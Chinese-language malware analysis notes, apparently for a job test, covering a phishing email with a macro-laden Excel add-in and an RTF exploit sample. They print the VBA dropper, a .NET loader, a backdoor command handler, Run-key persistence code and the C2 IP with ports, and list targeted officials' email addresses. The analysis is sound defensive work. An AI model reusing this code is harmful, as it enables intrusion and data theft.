@@ -1,0 +1,1063 @@
+---
+title: TeamT5筆試題目筆記
+tags: [Interview]
+
+---
+
+# TeamT5筆試題目筆記
+:::info
+前言: 通常我自己拿到一隻樣本，起手式會先搜一下hash，VirusTotal如果有紀錄的話最好，再來會丟到AnyRun看一下動態sandbox的狀態為何，但不確定這樣的操作是否符合本次筆試的預期，所以我會先設法在本機VM內分析看看，如果有利用這幾個online tools而得知的資訊，會再行標註
+:::
+:::danger
+經過二階面試後，用線上的工具例如VirusTotal和AnyRun都是被嚴格禁止的。
+第一個樣本總花費時間: 2天/第二個樣本總花費時間: 4天
+:::
+# 樣本(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a)
+## 惡意程式
+### 檔案資訊
+1. DIE(Detect It Easy)
+    ![圖片](https://hackmd.io/_uploads/S1Lbp6T3p.png)
+    看起來是一個HTML的純文字檔案
+2. File/Stat/Exiftool
+    從以下結果來看，是一個SMTP的郵件檔案，並且是純文字的形式，所以直覺上可能和Outlook或是Firefox Thunderbird有關係，以binwalk的結果來說，他應該有壓縮一些內容在其中，如果實際丟到Any.Run的話會發現的確有很多檔案被compressed
+    ![圖片](https://hackmd.io/_uploads/rJfrgyR3a.png)
+
+    或者是說，從檔案內容來看(HxD)，會發現data帶了一個base64的file，decode會發現是`0x50 4B 03 04`
+    :::spoiler Command Result
+    ```bash
+    $ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+    93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators
+    $ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+    ExifTool Version Number         : 12.40
+    File Name                       : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+    Directory                       : .
+    File Size                       : 180 KiB
+    File Modification Date/Time     : 2023:08:14 11:54:39+08:00
+    File Access Date/Time           : 2024:02:29 16:55:48+08:00
+    File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
+    File Permissions                : -rwxrwxrwx
+    File Type                       : TXT
+    File Type Extension             : txt
+    MIME Type                       : text/plain
+    MIME Encoding                   : us-ascii
+    Newlines                        : Windows CRLF
+    Line Count                      : 2410
+    Word Count                      : 2741
+    $ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+      File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+      Size: 184712          Blocks: 368        IO Block: 4096   regular file
+    Device: 66h/102d        Inode: 1688849860790082  Links: 1
+    Access: (0777/-rwxrwxrwx)  Uid: ( 1000/ sbk6401)   Gid: ( 1000/ sbk6401)
+    Access: 2024-02-29 16:55:48.949690200 +0800
+    Modify: 2023-08-14 11:54:39.000000000 +0800
+    Change: 2024-02-29 16:55:48.949690200 +0800
+     Birth: -
+    $ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+
+    DECIMAL       HEXADECIMAL     DESCRIPTION
+    --------------------------------------------------------------------------------
+    4244          0x1094          HTML document header
+    5554          0x15B2          HTML document footer
+    73264         0x11E30         StuffIt Deluxe Segment (data): fWm1
+    169908        0x297B4         IMG0 (VxWorks) header, size: 218780743
+    ```
+    :::
+### 執行流程
+1. 因為這是一個SMTP的檔案，所以先用VM的mail看一下裡面的資訊，沒意外的話根據上面的敘述，這應該是一個phishing email，並且把內文偽裝成印度的MHA政府部門(Ministry of Home Affairs, 內政部)
+    ![圖片](https://hackmd.io/_uploads/BkY1yBRna.png)
+2. 所以重點應該就是在信件中夾帶的檔案，也就是==Guidelines.xlam==，這也是一個沒有看過的extension，所以根據[^xlam]的說明，看起來這個檔案可以使用巨集，看到Macro這個關鍵字直覺上就感覺不太對勁，因為看過的實際案例就蠻常出現利用Macro夾帶一些script或是惡意的command
+    > XLAM file extension may refer to a file used by a spreadsheet program called Microsoft Excel. This program enables users to create and edit spreadsheets. These files also contain a macro-enabled add-in that provides extra tools and functionality that may execute macros. XLAM files may also be used for extension of Excel provided modules.
+3. 由於VM內沒有可以Excel，所以容許我用Any.Run Sandbox看一下中間執行的過程，首先針對前三個process，有很大的問題
+    ![圖片](https://hackmd.io/_uploads/HkXNuwZT6.png)
+    1. Unusual execution from MS Office
+        ```bash
+        $ C:\Users\admin\Glhvadia\hbraeiwas.exe
+        ```
+        不是很清楚這一個command line是怎麼來的，後來發現有一個VB script，從Any.Run中看不太出來他是怎麼執行的，所幸就直接在VM中安裝office來跟一下
+        ![圖片](https://hackmd.io/_uploads/rylQFw-6a.png)
+        
+        其實一開始執行==Guidelines.xlam==時會詢問要不要啟動Macro，也就是這個時候如果啟動就會執行惡意的file→`"C:\Users\admin\Glhvadia\hbraeiwas.exe", vbNormalNoFocus`
+    2. Analyze VBA
+        一開始也不知道怎麼在Excel中看VBA code，也是根據[^vba][^vba-excel]才知道，另外，由於是第一次碰到關於VBA的問題，所以有關於要從哪一個Module開始看也不是很清楚，不過還好他只有兩個Module，雖然我看不是很確定VBA的流程，但根據AI的解析可以略知一二
+        ![圖片](https://hackmd.io/_uploads/HJa3-Kb6T.png)
+        ```vb=
+        Sub userothraLoadr()
+            Dim path_othra_file As String
+            Dim file_othra_name  As String
+            Dim fldr_othra_name  As Variant
+            Dim byt() As Byte
+            Dim ar1othra() As String
+
+
+            file_othra_name = "hbraeiwas"
+            fldr_othra_name = Environ$("USERPROFILE") & "\Glhvadia\"
+
+            If Dir(fldr_othra_name, vbDirectory) = "" Then
+                MkDir (fldr_othra_name)
+            End If
+            path_othra_file = fldr_othra_name & file_othra_name & ".e"
+            If InStr(Application.OperatingSystem, "6.02") > 0 Or InStr(Application.OperatingSystem, "6.03") > 0 Then
+                ar1othra = Split(UserForm1.TextBox2.Text, "i")
+            Else
+                ar1othra = Split(UserForm1.TextBox1.Text, "i")
+            End If
+            Dim btsothra() As Byte
+            Dim linothra As Double
+            linothra = 0
+            For Each vl In ar1othra
+                ReDim Preserve btsothra(linothra)
+                btsothra(linothra) = CByte(vl)
+                linothra = linothra + 1
+            Next
+            Open path_othra_file & "xe" For Binary Access Write As #3
+                 Put #3, , btsothra
+            Close #3
+             Shell path_othra_file & "xe", vbNormalNoFocus
+        End Sub
+        ```
+        這個script簡單來說就是在做malware payload的extract，原本作者把惡意的payload scramble之後，當victim同意啟動Macro，他會再unscramble，可以看到下圖，他會依照不同的Application Version，選擇要用哪一個scramble payload接著把這些bits轉成bytes後寫到某一個檔案中，並且用shell執行該檔案，以上這些操作都極其詭異，另外他把檔案寫在
+        ```vb
+        Environ$("USERPROFILE") & "\Glhvadia\hbraeiwas"
+        ```
+        :::danger
+        這一段是錯的，他看的版本是OS的版本號，來決定要用哪一隻Payload，因為這和後面.NET的版很也有關係
+        :::
+        ![image](https://hackmd.io/_uploads/r1H_RTzp6.png)
+        實際去看也的確是在這邊
+        ![image](https://hackmd.io/_uploads/H1RAlCza6.png)
+    3. Anaylize hbraeiwas.exe
+        根據DIE的解析，這是一個用.NET寫的script，我之前碰到.NET的例子不多，唯一有碰過的reverse經驗是來自[臺大計安的welcome題-Nine & Nine-Revenge](https://hackmd.io/@SBK6401/HkIYEw8Kh)
+        ![image](https://hackmd.io/_uploads/HkBm8RfTT.png)
+        一開始並不知道要先看哪裡，所以看了一些`.NET` reversing的文章，發現可以先從自定義的module開始看，也就是`hbraeiwas`這個class，如下圖
+        ![image](https://hackmd.io/_uploads/H1M0HJQpp.png)
+        透過copilot的解析可以很方便的看出這個程式的主要功能是解壓縮一個 ZIP 檔案並啟動其中包含的應用程式。這種行為常見於一些惡意軟體中，因為它可以用於自解壓縮並執行惡意程式碼，如果直接用動態debugger，就會更清楚他把東西unzip到哪邊去，他是decompress到`C:\ProgramData\Hdlharas\dlrarhsiva.exe`，並且實際執行
+        ![image](https://hackmd.io/_uploads/HkWmWeXTa.png)
+        再詳細說明一下，他先instantiate Class1，並且把裡面的內容丟到`dlrarhsiva.exe`，再執行，所以如果不想要分析其他有的沒得東西，可以直接看`Resources\dlrarhsiva7`這個執行檔
+        ![image](https://hackmd.io/_uploads/HyMWUxmaa.png)
+        :::spoiler
+        ```csharp
+        public void UnZip()
+        {
+            try
+            {
+                string apppath = this.get_apppath();
+                Class1 @class = new Class1();
+                byte[] wind = @class.getWind();
+                bool flag = !Directory.Exists(apppath);
+                if (flag)
+                {
+                    Directory.CreateDirectory(apppath);
+                }
+                string text = apppath + this.appName;
+                File.WriteAllBytes(text, wind);
+                string text2 = apppath + "mdkhm.zip";
+                flag = !File.Exists(text2);
+                if (flag)
+                {
+                    File.Move(text, text2);
+                }
+                string text3 = text + ".exe".ToString();
+                flag = !File.Exists(text3);
+                if (flag)
+                {
+                    object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(this.shObj, null, "NameSpace", new object[]
+                    {
+                        apppath
+                    }, null, null, null));
+                    object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(this.shObj, null, "NameSpace", new object[]
+                    {
+                        text2
+                    }, null, null, null));
+                    NewLateBinding.LateCall(objectValue, null, "CopyHere", new object[]
+                    {
+                        RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, null, "Items", new object[0], null, null, null)),
+                        4
+                    }, null, null, null, true);
+                }
+                Process.Start(text3);
+            }
+            catch (Exception ex)
+            {
+            }
+        }
+        ```
+        :::
+    4. Anaylize dlrarhsiva.exe
+        根據DIE發現這也是一個.NET寫的PE file
+        ![image](https://hackmd.io/_uploads/S1mWzgXpa.png)
+        而且會發現module多了很多，實際進去看會發現應該是實際與C2 server連線和實作指令的地方，也就是後門的指令都在這邊
+        ![image](https://hackmd.io/_uploads/BJ1jV-mTT.png)
+        至於有哪一些操作，詳細可以看後門功能的section
+            
+                
+### 通訊協定
+我是直接把any.run的pcap download下來看有哪些東西
+```
+NBNS
+ARP
+ICMPv6
+LLMNR
+BROWSER
+DNS
+TCP
+DHCPv6
+MDNS
+STP
+```
+其實最主要C2 server和victim的連線主要是TCP，不過因為C2 server貌似沒有在運作了，所以沒辦法連線，我只能大概用連線失敗的封包以及後門的code判斷，至由有沒有其他的連線方式就不是很確定
+![image](https://hackmd.io/_uploads/HJlaEEQTa.png)
+
+
+### 加解密演算法
+就我本身的理解，看不太出來哪邊有特別做到加解密的事情，每一個步驟幾乎都只是一般的unscramble或是decompress可以解釋的地方
+### 後門功能
+1. Screenshot→
+                `dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/SLCLRNS/dlrarhsivascreen`
+    ![image](https://hackmd.io/_uploads/HyBqS-XTp.png)
+2. Remove User→`dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/OLRDMR/dlrarhsivaremove_user`
+    這一段我認為是想辦法把一些資料pull下來後，並且直接執行remove user的動作，所以實際跟進去==dlrarhsivapull_data==這個method，會發現的確如我所預測，只不過實作的方法是他先從server那一端看有多少的bytes需要pull，然後把該值轉成int後就直接pull資料
+    :::spoiler dlrarhsivapull_data() Source Code
+    ```csharp!
+    // dlrarhsiva.OLRDMR
+    // Token: 0x06000036 RID: 54 RVA: 0x0000480C File Offset: 0x00002A0C
+    public void dlrarhsivaremove_user()
+    {
+        try
+        {
+            byte[] array = this.server.dlrarhsivapull_data();
+            if (array != null)
+            {
+                if (!File.Exists(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + ".exe"))
+                {
+                    File.WriteAllBytes(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + ".exe", array);
+                    this.dlrarhsivado_process(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + ".exe");
+                }
+            }
+        }
+        catch
+        {
+        }
+    }
+    ```
+    :::
+3. Fetch Victim's Info→`dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/MLRLEINF/dlrarhsivaInfo`
+    從以下source code可以知道使用Info這個command可以得知victim的Username或是MachineName
+    :::spoiler dlrarhsivaInfo() Source Code
+    ```csharp
+    // dlrarhsiva.MLRLEINF
+    // Token: 0x06000031 RID: 49 RVA: 0x0000472C File Offset: 0x0000292C
+    private void dlrarhsivaInfo()
+    {
+        this.dlrarhsivaapver = "M.0.0.5|dlrarhsiva".Split(new char[]
+        {
+            '|'
+        })[0];
+        this.dlrarhsivacname = Environment.MachineName;
+        this.dlrarhsivauname = Environment.UserName;
+        this.dlrarhsivauip = "";
+        this.dlrarhsivalancard = "";
+    }
+    ```
+    :::
+4. Others
+    由於攻擊者可以使用的command實在是太多了，所以就直接列出來看比較清楚
+    ![image](https://hackmd.io/_uploads/Hyb8sb766.png)
+    比較重要的是get_command這個method，這個就和前面提到的pull data那個差不多，只是他後面還會帶上command和argument，便於下一些指令
+
+    另外，`dlrarhsivaimage_info()`這個method主要是看指定的圖片的一些相關資訊並且把該檔案上傳到某個地方，除此之外，還可以做到刪除檔案、上傳檔案、儲存檔案、查看user資訊等等，所有的command可以查看`dlrarhsivasee_responce()`這個method，裡面有紀錄所有遇到不同的command會執行對應的method(共有25個，詳細source code如下)
+    :::spoiler
+    ```csharp!
+    // dlrarhsiva.MLREDM
+    // Token: 0x06000018 RID: 24 RVA: 0x00002EB8 File Offset: 0x000010B8
+    private void dlrarhsivasee_responce()
+    {
+        if (!this.dlrarhsivaiswitch)
+        {
+            this.dlrarhsivaiswitch = true;
+            this.dlrarhsivanetStream = this.dlrarhsivaCMD.dlrarhsivaNS(this.dlrarhsivatcpsck);
+            this.dlrarhsivacapScreen = false;
+            while (this.dlrarhsivais_working)
+            {
+                MLREDM.<>c__DisplayClasse CS$<>8__locals1 = new MLREDM.<>c__DisplayClasse();
+                CS$<>8__locals1.<>4__this = this;
+                CS$<>8__locals1.switchType = this.dlrarhsivaget_command();
+                if (CS$<>8__locals1.switchType == null)
+                {
+                    this.dlrarhsivais_working = false;
+                    break;
+                }
+                this.dlrarhsivareqCnls = false;
+                string text = CS$<>8__locals1.switchType[0].ToLower();
+                if (text.Split(new char[]
+                {
+                    '-'
+                }).Length > 1)
+                {
+                    text = "dlrarhsiva-" + text.Split(new char[]
+                    {
+                        '-'
+                    })[1];
+                }
+                else
+                {
+                    text = "dlrarhsiva-" + text;
+                }
+                string text2 = text;
+                switch (text2)
+                {
+                case "dlrarhsiva-procl":
+                    this.dlrarhsivafunStarter = delegate()
+                    {
+                        this.dlrarhsivalist_processes("procl");
+                    };
+                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                    this.dlrarhsivafunThread.Start();
+                    break;
+                case "dlrarhsiva-getavs":
+                    this.dlrarhsivafunStarter = delegate()
+                    {
+                        this.dlrarhsivalist_processes("getavs");
+                    };
+                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                    this.dlrarhsivafunThread.Start();
+                    break;
+                case "dlrarhsiva-thumb":
+                    this.dlrarhsivaimage_info(CS$<>8__locals1.switchType[1]);
+                    break;
+                case "dlrarhsiva-putsrt":
+                    this.dlrarhsivaload_app();
+                    break;
+                case "dlrarhsiva-filsz":
+                    this.dlrarhsivafile_info(CS$<>8__locals1.switchType[1], false);
+                    break;
+                case "dlrarhsiva-rupth":
+                    this.dlrarhsivapush_data(null, "dlrarhsiva-appth=|dlrarhsiva".Split(new char[]
+                    {
+                        '|'
+                    })[0] + DLAONIF.dlrarhsivaget_mpath(), false);
+                    break;
+                case "dlrarhsiva-dowf":
+                    this.dlrarhsivasaveFile(CS$<>8__locals1.switchType[1]);
+                    break;
+                case "dlrarhsiva-endpo":
+                    try
+                    {
+                        Process.GetProcessById((int)Convert.ToInt16(CS$<>8__locals1.switchType[1].Trim())).Kill();
+                    }
+                    catch
+                    {
+                    }
+                    break;
+                case "dlrarhsiva-scrsz":
+                    this.dlrarhsivascreenSize(CS$<>8__locals1.switchType[1]);
+                    break;
+                case "dlrarhsiva-cscreen":
+                    this.dlrarhsivasee_scren(CS$<>8__locals1.switchType[1]);
+                    break;
+                case "dlrarhsiva-dirs":
+                    this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivalistDrives));
+                    this.dlrarhsivafunThread.Start();
+                    break;
+                case "dlrarhsiva-stops":
+                    this.dlrarhsivacapScreen = false;
+                    break;
+                case "dlrarhsiva-scren":
+                    this.dlrarhsivacapScreen = true;
+                    this.dlrarhsivafunStarter = delegate()
+                    {
+                        CS$<>8__locals1.<>4__this.dlrarhsivais_screen(CS$<>8__locals1.switchType[1]);
+                    };
+                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                    this.dlrarhsivafunThread.Start();
+                    break;
+                case "dlrarhsiva-cnls":
+                    this.dlrarhsivaautCnls = true;
+                    this.dlrarhsivareqCnls = true;
+                    this.dlrarhsivacapScreen = false;
+                    break;
+                case "dlrarhsiva-udlt":
+                    this.dlrarhsivaCMD.dlrarhsivaremove_user();
+                    break;
+                case "dlrarhsiva-delt":
+                    this.dlrarhsivaremove_file(CS$<>8__locals1.switchType[1]);
+                    break;
+                case "dlrarhsiva-afile":
+                    this.dlrarhsivafunStarter = delegate()
+                    {
+                        CS$<>8__locals1.<>4__this.dlrarhsivasend_auto(CS$<>8__locals1.switchType[1]);
+                    };
+                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                    this.dlrarhsivafunThread.Start();
+                    break;
+                case "dlrarhsiva-listf":
+                    this.dlrarhsivafunStarter = delegate()
+                    {
+                        CS$<>8__locals1.<>4__this.dlrarhsivaHD.dlrarhsivalookFiles(CS$<>8__locals1.switchType[1]);
+                    };
+                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                    this.dlrarhsivafunThread.Start();
+                    break;
+                case "dlrarhsiva-file":
+                    this.dlrarhsivafunStarter = delegate()
+                    {
+                        CS$<>8__locals1.<>4__this.dlrarhsivapush_file(CS$<>8__locals1.switchType[1]);
+                    };
+                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                    this.dlrarhsivafunThread.Start();
+                    break;
+                case "dlrarhsiva-info":
+                    this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivauser_info));
+                    this.dlrarhsivafunThread.Start();
+                    break;
+                case "dlrarhsiva-runf":
+                    this.dlrarhsivaCMD.dlrarhsivado_process(CS$<>8__locals1.switchType[1].Split(new char[]
+                    {
+                        '>'
+                    })[0]);
+                    break;
+                case "dlrarhsiva-fles":
+                {
+                    string files = this.dlrarhsivaHD.dlrarhsivalookupFiles(CS$<>8__locals1.switchType[1]);
+                    if (files != null)
+                    {
+                        this.dlrarhsivafunStarter = delegate()
+                        {
+                            CS$<>8__locals1.<>4__this.dlrarhsivapush_data(null, "dlrarhsiva-fles=|dlrarhsiva".Split(new char[]
+                            {
+                                '|'
+                            })[0] + files, false);
+                        };
+                        this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                        this.dlrarhsivafunThread.Start();
+                    }
+                    break;
+                }
+                case "dlrarhsiva-dowr":
+                    this.dlrarhsivasaveFile(CS$<>8__locals1.switchType[1]);
+                    break;
+                case "dlrarhsiva-fldr":
+                {
+                    string Folders = this.dlrarhsivaHD.dlrarhsivacheckFolders(CS$<>8__locals1.switchType[1]);
+                    if (Folders != null)
+                    {
+                        this.dlrarhsivafunStarter = delegate()
+                        {
+                            CS$<>8__locals1.<>4__this.dlrarhsivapush_data(null, "dlrarhsiva-fldr=|dlrarhsiva".Split(new char[]
+                            {
+                                '|'
+                            })[0] + Folders, false);
+                        };
+                        this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                        this.dlrarhsivafunThread.Start();
+                    }
+                    break;
+                }
+                }
+            }
+            this.dlrarhsivais_working = false;
+            this.dlrarhsivacapScreen = false;
+        }
+        this.dlrarhsivaiswitch = false;
+    }
+    ```
+    :::
+### 常駐方式
+1. 根據Any.Run的ATT&CK Matrix以及我自己分析的結果，看到他使用timer這個方式當作persisten的手法，當do_start() method啟動之後，隔一段時間就會觸發連線，並且每隔一段時間就會重新檢查connection(雖然Any.Run沒有看出來)，所以我猜這個手法對應的[ATT&CK ID應該是T1053.006](https://attack.mitre.org/techniques/T1053/006/)
+    ```csharp!
+    public void dlrarhsivado_start()
+    {
+        DLAONIF.dlrarhsivaport = DLAONIF.ports[0];
+        this.dlrarhsivaUPC = new MLRLEINF();
+        this.dlrarhsivaCMD = new OLRDMR(this);
+        this.dlrarhsivaHD.iserver = this;
+        this.dlrarhsivaHD.dlrarhsivamainPath = DLAONIF.dlrarhsivaget_mpath();
+        TimerCallback callback = new TimerCallback(this.dlrarhsivalookup_connect);
+        System.Threading.Timer dlrarhsivatimer = new System.Threading.Timer(callback, this.dlrarhsivaStateObj, 31280, 37420);
+        this.dlrarhsivaStateObj.dlrarhsivatimer = dlrarhsivatimer;
+    }
+    ```
+2. 另外，無意間用Autorun發現他有把`Hdlharas\dlrarhsiva.exe`註冊到registry中，這也是常見的套路，以ATT&CK的framework來說，應該是[T1547.001](https://attack.mitre.org/techniques/T1547/001/)(Any.Run還是沒有看出來)，詳細的code如下
+    ![圖片](https://hackmd.io/_uploads/rygmHumT6.png)
+    ```csharp!
+    public static void dlrarhsivaset_run(string app, string path)
+    {
+        try
+        {
+            string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|dlrarhsiva".Split(new char[]
+            {
+                '|'
+            })[0];
+            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
+            string str = DLAONIF.dlrarhsivapc_id;
+            object value = registryKey.GetValue(str + app);
+            if (value == null)
+            {
+                registryKey.SetValue(str + app, path);
+            }
+            else if (value.ToString() != path)
+            {
+                registryKey.SetValue(str + app, path);
+            }
+        }
+        catch
+        {
+        }
+    }
+    ```
+    這是在`DLAONIF`這個module中，主要會由`MLREDM/dlrarhsivaload_app`這個method呼叫到，對應倒的指令是==dlrarhsiva-putsrt==
+    ![圖片](https://hackmd.io/_uploads/SJqMqdXa6.png)
+
+## 中繼站
+### 基本資訊
+在前面提到的後門功能中有一個是專門處理網路連線的(`dlrarhsivaIPSConfig`)，這其實蠻有趣的，他不直接寫出連線的IP，反而是做了簡單的ascii轉換後才進行連線，如下所示
+1. MLREDM/dlrarhsivaIPSConfig()
+    這一段主要是進行連線，但是在連線前會進行IP parsing和fetching port的動作(如下一段所示)
+    ```csharp!
+    // dlrarhsiva.MLREDM
+    // Token: 0x0600001A RID: 26 RVA: 0x0000365C File Offset: 0x0000185C
+    private bool dlrarhsivaIPSConfig()
+    {
+        bool result;
+        try
+        {
+            DLAONIF.dlrarhsivadefaultP = this.dlrarhsivaCMD.dlrarhsivaserverIPD();
+            this.dlrarhsivatcpsck = new TcpClient();
+            this.dlrarhsivatcpsck.Connect(DLAONIF.dlrarhsivadefaultP, DLAONIF.dlrarhsivaport);
+            result = true;
+        }
+        catch
+        {
+            this.dlrarhsivaports_switch();
+            result = false;
+        }
+        return result;
+    }
+    ```
+2. OLRDMR/dlrarhsivaserverIPD()
+    這一段就是把DLAONIF.dlrarhsivavpsips轉換成UTF-8而已，原本是ascii的integer形式，轉換後就變成一般的ascii string，也就是==185.136.161.124==
+    ```csharp!
+    using System;
+    using System.Diagnostics;
+    using System.IO;
+    using System.Net.Sockets;
+    using System.Text;
+
+    namespace dlrarhsiva
+    {
+        // Token: 0x02000009 RID: 9
+        internal class OLRDMR
+        {
+            ...
+            public string dlrarhsivaserverIPD()
+            {
+                return Encoding.UTF8.GetString(DLAONIF.dlrarhsivavpsips, 0, DLAONIF.dlrarhsivavpsips.Length);
+            }
+            ...
+            // Token: 0x0400003A RID: 58
+            public MLREDM server;
+        }
+    }
+    ```
+3. DLAONIF/
+    也可以自行轉換下面的IP，另外他有好幾個Port，詳細的code可以參考MLREDM/dlrarhsivaports_switch()這個method，在default port 6128連不上去的時候可以自行切換預先設定好的port number
+    ```csharp!
+    using System;
+    using System.IO;
+    using System.Windows.Forms;
+    using Microsoft.Win32;
+
+    namespace dlrarhsiva
+    {
+        // Token: 0x02000002 RID: 2
+        internal static class DLAONIF
+        {
+            ...
+            public static int[] ports = new int[]
+            {
+                6128,
+                8761,
+                11614,
+                15822,
+                17443
+            };
+
+            // Token: 0x04000005 RID: 5
+            public static byte[] dlrarhsivavpsips = new byte[]
+            {
+                49,
+                56,
+                53,
+                46,
+                49,
+                51,
+                54,
+                46,
+                49,
+                54,
+                49,
+                46,
+                49,
+                50,
+                52
+            };
+
+            // Token: 0x0400000A RID: 10
+            public static string dlrarhsivaAppPath = "";
+        }
+    }
+    ```
+### 關連資訊
+我不是很確定關聯資訊想要的形式是什麼，所以我選擇參考[whois的結果](https://ipwhoisinfo.com/ip/185.136.161.124)和[VirusTotal的結果](https://www.virustotal.com/gui/file/0335de8eadbbd5dc7cbe92ef869bcea6f6596ac39a38680142c982ec6e97ecde/behavior)互相對照，這個IP是來自於法國的Strasbourg，是在德國與法國超邊界的地方
+## 威脅情資
+### 攻擊者
+`Duty Staff Officer <ram.ratan909@navy.gov.in>`，我在OSINT的各個online tool都沒有找到相關的資訊，而且有些甚至還說這是valid，想一想也對，這個mail的format看起來是屬於政府單位，所以我猜可能是政府單位的某個AD account被拿下來，然後就發送這樣的訊息出去，成功率看起來也會比較高
+:::danger
+正確答案是攻擊者可以篡改mail文件中的寄送人和router資訊，所以要實際去裡面看寄送的IP，有可能這個就是該攻擊者的C2 Server，所以其實攻擊者沒有把AD account拿下來
+:::
+### 攻擊時間
+`Tue, 28 Apr 2020 10:50:41 +0530 (IST)`
+### 受害者
+從郵件中的CC User來看，"可能"的受害者有以下幾個
+```
+"Wg Cdr MA  JAFFER ALI" <jdwcdma@iaf.nic.in>
+"Wg Cdr PAWAN BENIWAL" <wanwal.26965@gov.in>
+"Wg Cdr Kundan Kumar"<challenger@nic.in>
+"Wing Commander Raji kurian" <yatch.master@gov.in>
+"SLO 54 ASP" <teacher_town@nic.in>
+"Gp Capt Atul Kumar Arora" <moon.light@gov.in>
+"Flt Lt Richa Bansal" <mtl.amer@nic.in>
+```
+
+---
+# 樣本(5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9)
+## 惡意程式
+### 檔案資訊
+1. DIE(Detect It Easy)
+    ![圖片](https://hackmd.io/_uploads/BygTPpT2T.png)
+    從DIE來看並沒有什麼特別的packer或是linker，反而出現RTF格式，一開始不知道這是什麼，但根據[^rtf]的說明，應該可以理解成比較廣泛性的Word文字檔案
+    > 富文本格式（Rich Text Format, 一般簡稱為RTF）是由微軟公司開發的跨平台文檔格式。大多數的文字處理軟體都能讀取和保存RTF文檔。RTF是Rich TextFormat的縮寫，意即多文本格式。這是一種類似DOC格式（Word文檔）的檔案，有很好的兼容性，使用Windows“附屬檔案”中的“寫字板”就能打開並進行編輯。RTF是一種非常流行的檔案結構，很多文字編輯器都支持它。一般的格式設定，比如字型和段落設定，頁面設定等等信息都可以存在RTF格式中，它能在一定程度上實現word與wps檔案之間的互訪。
+2. File/Stat/Exiftool
+    從以下的結果來看，這個檔案的確是RTF格式且Created Time是在2019年
+    :::spoiler Command Result
+    ```bash
+    $ file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
+    5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9: Rich Text Format data, version 1, ANSI, code page 936, default middle east language ID 1025
+    $ exiftool 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
+    ExifTool Version Number         : 12.40
+    File Name                       : 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
+    Directory                       : .
+    File Size                       : 217 KiB
+    File Modification Date/Time     : 2023:08:14 11:54:52+08:00
+    File Access Date/Time           : 2024:02:29 16:55:48+08:00
+    File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
+    File Permissions                : -rwxrwxrwx
+    File Type                       : RTF
+    File Type Extension             : rtf
+    MIME Type                       : text/rtf
+    Warning                         : Unsupported RTF encoding cp936. Will assume Latin.
+    Last Modified By                : Koby
+    Create Date                     : 2019:12:24 10:28:00
+    Modify Date                     : 2019:12:24 10:28:00
+    Revision Number                 : 2
+    Total Edit Time                 : 0
+    Pages                           : 1
+    Words                           : 252
+    Characters                      : 1441
+    Characters With Spaces          : 1690
+    Internal Version Number         : 117
+    $ stat 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
+      File: 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
+      Size: 222012          Blocks: 440        IO Block: 4096   regular file
+    Device: 66h/102d        Inode: 2814749767539972  Links: 1
+    Access: (0777/-rwxrwxrwx)  Uid: ( 1000/ sbk6401)   Gid: ( 1000/ sbk6401)
+    Access: 2024-02-29 16:55:48.947690500 +0800
+    Modify: 2023-08-14 11:54:52.000000000 +0800
+    Change: 2024-02-29 16:55:48.947690500 +0800
+     Birth: -
+    ```
+    :::
+3. 這一題在沒有看VirusTotal或是Any.Run的情況之下，我在local VM內真的看不出來有什麼問題，後來忍不住上網看一下相關的hash，發現他是使用==CVE-2017-11882==這個由Microsoft提出的漏洞開發出來的malware file[^virustotla-cve-2017-11882]，而比較新的版本大部分都已經被patch了，所以我在VM內才會找不出相關的攻擊痕跡(浪費了很多時間)
+    ![螢幕擷取畫面 2024-03-05 135304](https://hackmd.io/_uploads/HkR0X4V66.png)
+    從上圖來看，沒有看到任何執行EQNEDT32.EXE的process，為了能夠在local端實際看到攻擊的軌跡，我從學校的授權軟體網站中下載了Office 2016(原本是2021)，才發現相關的patch還沒普及到這個版本(是不是要通報一下計中呢??🤔)
